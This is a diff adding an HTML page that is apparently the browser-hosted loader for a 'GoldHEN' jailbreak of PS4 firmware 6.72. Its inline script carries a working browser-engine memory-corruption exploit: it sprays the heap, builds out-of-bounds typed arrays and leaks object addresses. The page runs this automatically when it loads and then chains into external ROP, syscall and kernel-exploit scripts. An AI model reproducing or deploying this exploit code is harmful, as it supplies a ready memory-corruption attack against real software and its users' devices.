@@ -1,0 +1,212 @@
+<html manifest="cache.manifest">
+<head>
+    <meta charset="UTF-8" />
+    <title>PS4 6.72 GoldHEN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        #msgs {
+            font-size: 38px;
+            text-align: center;
+            margin: 20px 0;
+            text-shadow: 0 0 10px rgba(0, 150, 255, 0.7);
+            position: relative;
+            z-index: 2;
+        }
+        
+        #console {
+            display: none;
+        }
+        
+        .loader {
+            width: 125px;
+            height: 125px;
+            border: 10px solid rgba(255, 255, 255, 0.1);
+            border-top: 10px solid #4dabf7;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 30px auto;
+            box-shadow: 0 0 30px rgba(77, 171, 247, 0.5);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 20px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+       
+    </style>
+    <script>
+        var leaker_obj = {a: 0}; 
+        var leaker_arr = new Uint32Array(6); 
+        var oob_slave = new Uint8Array(512); 
+        var oob_master = new Uint32Array(7); 
+        var spray = []; 
+        for(var i = 0; i < 0x8000; i++) { 
+            var x = new Uint32Array(1); 
+            x[spray.length+'spray'] = 123; 
+            spray.push(x); 
+        } 
+        var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678}; 
+        var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678}; 
+        var impl_idx = 0; 
+        var prop_cache = []; 
+        for(var i = 0; i < 32; i++) { 
+            prop_cache[i] = i + 'x'; 
+        } 
+        
+        function create_impl() { 
+            var ans = {a: target}; 
+            var empty_obj = {}; 
+            for(var i = 0; i < 32; i++) 
+                ans[prop_cache[i]] = empty_obj; 
+            return ans; 
+        } 
+        
+        var exploit_success = false;
+        
+        function trigger(x) { 
+            if(impl.a !== target) { 
+                return; 
+            } 
+            var o = {a: 1}; 
+            for(var i in o) { 
+                { 
+                    i = x; 
+                    function i(){} 
+                } 
+                o[i]; 
+            } 
+            if(impl.a === target) 
+                return; 
+            print(typeof (impl.a)); 
+            print(impl.a.length); 
+            target.c = leaker_obj; 
+            leaker_obj.a = leaker_obj; 
+            var l1 = impl.a[4]; 
+            var l2 = impl.a[5]; 
+            leaker_obj.a = oob_slave; 
+            var s1 = impl.a[4]; 
+            var s2 = impl.a[5]; 
+            target.c = leaker_arr; 
+            impl.a[4] = l1; 
+            impl.a[5] = l2; 
+            target.c = oob_master; 
+            impl.a[4] = s1; 
+            impl.a[5] = s2; 
+            impl.a = target; 
+            print([l1, l2, s1, s2]); 
+            exploit_success = true;
+        } 
+        
+        try { 
+            var max_iterations = 512; 
+            for(var _ = 0; _ < max_iterations; _++) { 
+                var impl = create_impl(); 
+                var s = {a: impl}; 
+                trigger(s); 
+                if(exploit_success) {
+                    break;
+                }
+            } 
+        } catch(e) { 
+        }
+
+        function CacheProgress(e){
+            const msgs = document.getElementById('msgs');
+            if (msgs) {
+                const Percent = (Math.round(e.loaded / e.total * 100));
+                msgs.innerHTML = "Installing Offline Cache: " + Percent + "%"; 
+            }
+        }
+        
+        function CachingDone(){
+            const msgs = document.getElementById('msgs');
+            setTimeout(function(){
+                localStorage.cached = "yes";
+                if (msgs) {
+                    msgs.innerHTML = "Cache Installed Successfully<br>Re-Open The Browser To Continue...";
+                }
+            }, 2000);
+        }
+        
+        window.applicationCache.addEventListener("progress",CacheProgress,false);
+        window.applicationCache.oncached=function(e){CachingDone();};
+        window.applicationCache.onnoupdate=function(){setTimeout(function(){jailbreak(); p.write8(0, 0);},250);};
+        window.applicationCache.onerror=function(){setTimeout(function(){jailbreak(); p.write8(0, 0);},250);};
+    </script>
+</head>
+<body>
+    <div id="msgs" class="pulse">
+        Loading GoldHEN ...
+        <div class="loader"></div> 
+    </div>
+    <div class="footer">PS4 6.72 GoldHEN</div>
+
+    <script src="./rop.js" defer></script>
+    <script src="./syscalls.js" defer></script>
+    <script src="./expl.js" defer></script>
+    <script src="./jb.js" defer></script>
+    <script src="./exploit.js" defer></script>
+    <script src="./goldhen.js" defer></script> 
+    <script>
+        let bigArray = null;
+        function allocate() {
+            bigArray = new Array(1_600_000).fill(undefined);
+        }
+    </script>
+    <script>
+        let startExploitCalled = false;
+
+        async function gold() {
+            const progress = document.getElementById('progress');
+            const msgs = document.getElementById('msgs');
+
+            try {
+                if (!startExploitCalled) {
+                    await start_exploit();
+                    startExploitCalled = true;
+                }
+                await stagegold();
+                if (progress) {
+                    progress.innerHTML = '<div></div>'; 
+                }
+            } catch (e) {
+            }
+        }
+    </script>
+    <script>
+        window.addEventListener('load',function(){setTimeout(function(){if(typeof gold==='function'){gold();}},1500);});
+    </script>
+    <pre id="console"></pre>
+</body>
+</html>
